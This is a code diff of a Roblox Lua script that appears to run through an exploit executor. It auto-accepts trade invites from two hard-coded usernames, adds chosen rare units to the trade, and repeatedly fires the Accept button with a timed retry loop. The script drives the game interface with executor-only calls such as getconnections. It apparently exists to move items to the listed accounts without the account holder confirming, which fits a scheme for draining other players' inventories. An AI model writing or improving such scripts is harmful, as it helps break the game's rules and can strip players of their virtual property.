@@ -1,6 +1,9 @@
 local allowedUsernames = {"dusfuxx", "skies1R"}
 local addUnits = {"unit_rafflesia", "unit_christmas_bell"}
-local repeatCounts = {unit_rafflesia = 3, unit_christmas_bell = 4}
+local repeatCounts = {
+    unit_rafflesia = 3,
+    unit_christmas_bell = 4
+}
 
 local Players = game:GetService("Players")
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
@@ -11,9 +14,7 @@ local middle = screen:WaitForChild("Middle")
 
 local function isAllowed(username)
     for _, name in ipairs(allowedUsernames) do
-        if name == username then
-            return true
-        end
+        if name == username then return true end
     end
     return false
 end
@@ -22,9 +23,7 @@ local function acceptInvite(username)
     local targetPlayer = Players:FindFirstChild(username)
     if targetPlayer then
         pcall(function()
-            ReplicatedStorage:WaitForChild("RemoteFunctions")
-                :WaitForChild("TradeAcceptInvite")
-                :InvokeServer(targetPlayer)
+            ReplicatedStorage.RemoteFunctions.TradeAcceptInvite:InvokeServer(targetPlayer)
         end)
     end
 end
@@ -32,36 +31,21 @@ end
 local function selectUnitAndAdd(trade, unitName, repeatCount)
     local unitScrolling = trade.Inventory.Inventory.Frame.Items.Items.ScrollingFrame
     local unit = unitScrolling:FindFirstChild(unitName)
-    if not unit then
-        for _, child in ipairs(unitScrolling:GetChildren()) do
-            if child:IsA("Frame") and child.Name:lower():find(unitName:lower()) then
-                unit = child
-                break
-            end
-        end
-    end
     if not unit then return end
 
     local button = unit:FindFirstChildWhichIsA("TextButton", true) or unit
-    pcall(function()
-        unitScrolling.CanvasPosition = Vector2.new(
-            0,
-            math.max(0, unit.AbsolutePosition.Y - unitScrolling.AbsolutePosition.Y - 50)
-        )
-    end)
 
-    task.wait(0.1)
     for i = 1, repeatCount do
         pcall(function()
-            local conns = getconnections(button.MouseButton1Click)
-            if conns and #conns > 0 then conns[1]:Fire() end
+            local c = getconnections(button.MouseButton1Click)
+            if c and #c > 0 then c[1]:Fire() end
         end)
         task.wait(0.1)
 
         local addButton = trade.AmountAdd.Frame.Frame.Actions.Items.Add
         pcall(function()
-            local conns = getconnections(addButton.MouseButton1Click)
-            if conns and #conns > 0 then conns[1]:Fire() end
+            local c = getconnections(addButton.MouseButton1Click)
+            if c and #c > 0 then c[1]:Fire() end
         end)
         task.wait(0.3)
     end
@@ -70,16 +54,9 @@ end
 local function handleTrade(trade)
     local tradeCompleted = false
 
-    local acceptButton1 = trade.Terms.Items.Buttons.Items.Accept
     task.wait(6)
     pcall(function()
-        local c = getconnections(acceptButton1.MouseButton1Click)
-        if c and #c > 0 then c[1]:Fire() end
-    end)
-
-    local unitMoreButton = trade.Items.Container.Items.Left.Give.Items.ScrollingFrame.unit_more.TextButton
-    pcall(function()
-        local c = getconnections(unitMoreButton.MouseButton1Click)
+        local c = getconnections(trade.Terms.Items.Buttons.Items.Accept.MouseButton1Click)
         if c and #c > 0 then c[1]:Fire() end
     end)
 
@@ -87,20 +64,22 @@ local function handleTrade(trade)
         selectUnitAndAdd(trade, unitName, repeatCounts[unitName] or 1)
     end
 
+    -- ===== Accept 2 (Retry Mode) =====
     spawn(function()
         local receiveFrame =
             player.PlayerGui.GameGui.Screen.Middle.Trade
             .Items.Container.Items.Right.Receive.Items.ScrollingFrame
 
-        local acceptButton2 =
+        local acceptButton =
             player.PlayerGui.GameGui.Screen.Middle.Trade
             .Items.Container.Items.Right.Controls.Items.Buttons.Accept
 
         local lastSnapshot = {}
+        local pendingAccept = false
+        local lastCheckTime = 0
 
         local function getSnapshot()
-            local snap = {}
-            local count = 0
+            local snap, count = {}, 0
             for _, unit in ipairs(receiveFrame:GetChildren()) do
                 if unit:IsA("Frame") then
                     snap[unit.Name] = true
@@ -125,17 +104,24 @@ local function handleTrade(trade)
 
             if unitCount > 0 and snapshotChanged(snap) then
                 lastSnapshot = snap
-                if acceptButton2 and acceptButton2.Visible then
-                    local conns = getconnections(acceptButton2.MouseButton1Click)
-                    if conns and #conns > 0 then
-                        pcall(function()
-                            conns[1]:Fire()
-                        end)
+                pendingAccept = true
+            end
+
+            if pendingAccept and unitCount > 0 then
+                if tick() - lastCheckTime >= 3 then
+                    lastCheckTime = tick()
+                    if acceptButton and acceptButton.Visible then
+                        local c = getconnections(acceptButton.MouseButton1Click)
+                        if c and #c > 0 then
+                            pcall(function()
+                                c[1]:Fire()
+                            end)
+                        end
                     end
                 end
             end
 
-            task.wait(0.5)
+            task.wait(0.3)
         end
 
         tradeCompleted = true
@@ -148,6 +134,7 @@ end
 
 spawn(function()
     local currentTrade = nil
+
     while true do
         for _, p in ipairs(Players:GetPlayers()) do
             if isAllowed(p.Name) then
